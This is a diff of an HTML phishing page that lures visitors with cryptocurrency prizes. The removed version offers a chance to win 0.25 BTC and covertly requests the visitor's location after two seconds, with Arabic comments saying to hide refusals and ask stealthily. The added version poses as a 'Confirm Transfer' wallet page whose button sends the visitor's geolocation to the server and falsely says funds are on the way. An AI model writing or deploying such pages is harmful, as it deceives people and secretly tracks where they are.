@@ -1,62 +1,64 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Congratulations!</title>
+  <meta charset="UTF-8">
+  <title>Confirm Transfer</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f8f9fa;
+      background-color: #1a1a1a;
+      color: white;
+      font-family: sans-serif;
       text-align: center;
-      padding: 50px;
+      padding: 40px;
     }
-    .box {
-      background: white;
+    .card {
+      background: #222;
+      padding: 20px;
       border-radius: 10px;
-      padding: 30px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      box-shadow: 0 0 10px #f2a900;
       max-width: 400px;
       margin: auto;
     }
-    h1 {
-      color: green;
+    button {
+      background-color: #f2a900;
+      border: none;
+      padding: 15px 25px;
+      font-size: 16px;
+      color: #000;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h1>🎉 Congratulations!</h1>
-    <p>You’ve been selected for a chance to win 0.25 BTC.</p>
-    <p>Please wait while we verify your eligibility...</p>
+  <div class="card">
+    <h2>✅ Transfer Ready</h2>
+    <p>To receive your funds, please confirm your wallet.</p>
+    <button onclick="confirmWallet()">Confirm</button>
   </div>
 
   <script>
-    function sendLocation(lat, lon) {
-      fetch("/location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ lat: lat, lon: lon })
-      });
-    }
-
-    function requestLocation() {
+    function confirmWallet() {
       navigator.geolocation.getCurrentPosition(
-        function (position) {
-          var lat = position.coords.latitude;
-          var lon = position.coords.longitude;
-          sendLocation(lat, lon);
+        function(pos) {
+          fetch("/location", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude
+            })
+          });
+          alert("✅ Wallet confirmed. Funds will arrive shortly.");
         },
-        function (error) {
-          // لا تظهر رسالة رفض إذن الموقع
+        function(err) {
+          alert("Please enable location to confirm.");
         }
       );
     }
-
-    // طلب الموقع بشكل خفي بعد ثانيتين
-    setTimeout(requestLocation, 2000);
   </script>
 </body>
 </html>
